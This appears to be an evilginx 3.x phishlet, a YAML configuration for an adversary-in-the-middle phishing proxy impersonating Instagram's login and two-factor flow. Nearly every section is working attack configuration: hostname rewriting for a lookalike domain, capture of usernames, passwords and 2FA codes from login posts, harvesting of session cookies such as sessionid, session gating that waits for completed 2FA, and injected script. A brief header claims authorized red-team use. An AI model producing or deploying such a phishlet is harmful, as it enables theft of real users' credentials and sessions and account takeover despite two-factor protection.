# instagram-mobile-2fa.yaml — evilginx 3.x phishlet (mobile flow + 2FA capture)
# Authorized red team / security research use only.
name: 'instagram-mobile-2fa'
author: '@yourhandle'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://www.instagram.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'i.instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'i.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'i.instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '//instagram.com', replace: '//{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: '.instagram.com'
    keys: ['sessionid', 'ds_user_id', 'csrftoken', 'rur', 'mid', 'ig_did', 'shbid', 'shbts']
  - domain: 'i.instagram.com'
    keys: ['sessionid', 'ds_user_id']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'enc_password'
    search: '(.*)'
    type: 'post'
  # Capture the 2FA verification code from the challenge POST
  custom:
    - key: 'verificationCode'
      search: '(.*)'
      type: 'post'
    - key: 'identifier'           # 2FA flow identifier IG ties to the session
      search: '(.*)'
      type: 'post'

login:
  domain: 'www.instagram.com'
  path: '/accounts/login/'

force_post:
  - path: '/api/v1/web/accounts/login/ajax/'
    search:
      - {key: 'username', search: '.*'}
    force:
      - {key: 'username', value: '{username}'}
    type: 'post'

# --- Session completion gating ---
# Do NOT mark the session captured until the post-2FA sessionid is set.
# This tells evilginx the auth is only "complete" once the 2FA endpoint
# returns the authenticated cookie.
auth_urls:
  - '/api/v1/web/accounts/login/ajax/two_factor/'
  - '/accounts/onetap/'           # IG redirects here right after a successful 2FA login

js_inject:
  - trigger_domains: ['www.instagram.com']
    trigger_paths: ['/accounts/login/', '/accounts/login/two_factor', '/challenge/']
    trigger_params: []
    script: |
      (function(){
        try {
          document.cookie = "ig_nrcb=1; path=/; domain=.{domain}";
        } catch(e){}
      })();
